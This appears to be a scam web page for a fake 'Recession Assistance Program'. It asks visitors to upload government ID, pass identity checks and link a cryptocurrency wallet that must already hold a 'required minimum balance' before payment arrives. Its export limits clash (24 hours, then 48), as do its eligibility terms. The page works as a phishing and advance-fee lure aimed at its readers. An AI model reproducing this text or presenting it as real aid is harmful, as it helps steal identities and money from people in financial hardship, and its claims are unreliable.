How to apply and receive your Recession Assistance Payments

The stages of receiving your Recession Assistance Funds for business, self-employed individuals, or independent contractors are described below:

  • Complete your Preliminary Application
  • Complete Payment Survey and Identity Verification
  • Provide a verified digital currency wallet for your Recession Assistance Funds (Secured by Plaid)
  • Export your PAP funds. (You are only allowed to export half of your available balance within 24 hours due to the recent hike in fraudulent exportation of individuals and small businesses)

Submitting someones else's information will lead to immediate termination of your Recession Assistance Program.

ACCESS ACCOUNT

To qualify for the Recession Assistance Funds for citizens of the United States of America, you must:

  • Live in the US/Canada or its territories
  • Be available for manual verification of identity if required during your program lifecycle.
  • Provide proof of income loss or financial hardship due to the recession.
  • Have a valid government-issued ID.
  • Agree to the terms and conditions of the Recession Assistance Program.

Step-by-Step Guide:

Follow these steps to complete your identification and wallet requirements:

  1. Complete your payment survery, upload your government-issued ID and other documents for verification.
  2. Complete the identity verification process through our secure platform.
  3. Provide a valid digital currency wallet for receiving funds.
  4. Connect your wallet to your Recession Assistance Program in your account securely using Plaid.
  5. Ensure your personal information matches your wallet information to avoid fraud triggers.

After your identity has been verified and you have provided a validated digital currency wallet, you are then approved to receive your PAP payment. However, you are only allowed to export half of your available balance within 48 hours. If there are multiple exportations during the same hour, your account will be flagged with suspicious activities.

To ensure the security of your funds, follow these guidelines:

  • Use a secure and verified digital currency wallet.(Your wallet must have up to the required minimum balance in it, before your exported payment can be available in the wallet)
  • Regularly monitor your wallet for any unauthorized transactions.
  • Report any suspicious activities to your appointed Finance Officer immediately.
  • Do not share your wallet credentials with anyone.
  • Follow the exportation limits to avoid account suspension.
